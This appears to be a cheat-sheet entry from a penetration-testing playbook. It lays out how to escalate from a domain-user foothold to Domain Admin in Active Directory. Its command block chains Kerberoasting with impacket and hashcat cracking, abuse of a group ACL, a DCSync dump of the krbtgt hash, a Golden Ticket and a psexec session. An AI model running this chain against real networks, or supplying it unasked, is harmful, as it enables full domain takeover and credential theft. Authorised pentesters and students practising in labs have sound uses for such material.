# 19.01 Domain Foothold → DA

> Walk BloodHound's shortest path — kerberoast→crack→DCSync, ACL abuse, or unconstrained delegation — until you hold a DA session.

## Overview

Once in the AD, follow BloodHound's shortest-path to DA — kerberoast → crack → DCSync, or ACL abuse, or unconstrained delegation. Always end with a Domain Admin session.

## Steps

- **Run SharpHound from a domain user**.
- **Pick the shortest path** in the graph.
- **Execute it step by step** — kerberoast/AS-REP/ACL.
- **End with DCSync krbtgt + DA cmd**.

## Commands

### DA chain

```bash
# 1. Kerberoast
impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -request -dc-ip <DC-IP> -outputfile r.txt
hashcat -m 13100 r.txt rockyou.txt
# 2. With cracked service-account, BloodHound says DA via ACL on group 'Backup Admins'
impacket-net rpc group addmem 'Backup Admins' <USER> -U <DOMAIN>/svc:<CRACKED-PASS>
# 3. DCSync
impacket-secretsdump -just-dc-user krbtgt <DOMAIN>/<USER>:<PASS>@<DC-IP>
# 4. Golden Ticket → DA
# 5. impacket-psexec <DOMAIN>/Administrator@<DC>
```
